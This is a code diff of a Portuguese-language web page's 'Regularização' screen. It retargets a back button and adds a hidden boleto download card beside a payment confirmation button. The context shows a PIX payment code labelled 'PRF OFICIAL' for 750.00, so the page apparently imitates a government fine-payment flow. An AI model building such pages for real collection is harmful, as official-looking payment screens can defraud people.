@@ -170,7 +170,7 @@
         <section id="regularizacao" class="screen interna">
 
             <div class="header">
-                <span class="back" onclick="goTo('detalhes')">←</span>
+                <span class="back" onclick="goTo('dashboard')">←</span>
                 <h2>Regularização</h2>
             </div>
 
@@ -249,14 +249,26 @@
 00020126580014BR.GOV.BCB.PIX0136chavepix@empresa.gov.br5204000053039865405750.005802BR5913PRF OFICIAL6009BRASILIA62070503***
                     </textarea>
                 </div>
+    <!-- BOLETO -->
+<div class="card" id="areaBoleto" style="display:none;">
 
-               <div class="btn-confirmar-wrapper">
+    <div class="doc-item">
+        <span>boleto.pdf</span>
+        <a href="#" onclick="baixarBoleto()" class="btn-download">
+            Baixar
+        </a>
+    </div>
+
+</div>
+               <div class="btn-confirmar-wrapper" id="wrapperConfirmar">
     <button class="primary btn-confirmar" onclick="confirmarPagamento()">
         Confirmar Pagamento
     </button>
 </div>
 
             </div>
+
+           
         </section>
 
         <!-- ================= SUCESSO ================= -->
